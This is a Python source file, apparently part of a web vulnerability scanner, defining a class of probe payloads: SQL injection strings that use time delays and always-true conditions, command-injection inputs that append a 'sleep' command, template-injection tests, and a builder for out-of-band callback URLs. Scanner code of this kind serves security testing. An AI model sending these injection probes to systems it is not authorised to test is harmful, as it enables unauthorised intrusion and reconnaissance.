from __future__ import annotations

import uuid


class PayloadGenerator:
    """Generates context-aware, adaptive test payloads."""

    SQLI_PROBES = [
        ("time_sleep", "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)-- "),
        ("time_pg", "1'; SELECT pg_sleep(3)--"),
        ("boolean_true", "1' OR '1'='1"),
        ("boolean_false", "1' OR '1'='2"),
        ("quote_break", "'\"`"),
    ]

    CMD_INJECTION_PROBES = [
        ("sleep_pipe", "| sleep 3"),
        ("sleep_and", "&& sleep 3"),
        ("sleep_semi", "; sleep 3;"),
    ]

    SSTI_PROBES = [
        ("jinja_calc", "{{7*7}}"),
        ("polyglot", "${7*7}"),
    ]

    @classmethod
    def generate_sqli_payloads(cls) -> list[tuple[str, str]]:
        return list(cls.SQLI_PROBES)

    @classmethod
    def generate_cmd_payloads(cls) -> list[tuple[str, str]]:
        return list(cls.CMD_INJECTION_PROBES)

    @classmethod
    def generate_callback_url(cls, callback_host: str, probe_tag: str = "oob") -> tuple[str, str]:
        """Generates a unique OOB nonce and URL for tracking blind interactions."""
        nonce = f"{probe_tag}_{uuid.uuid4().hex[:12]}"
        url = f"http://{nonce}.{callback_host}"
        return nonce, url
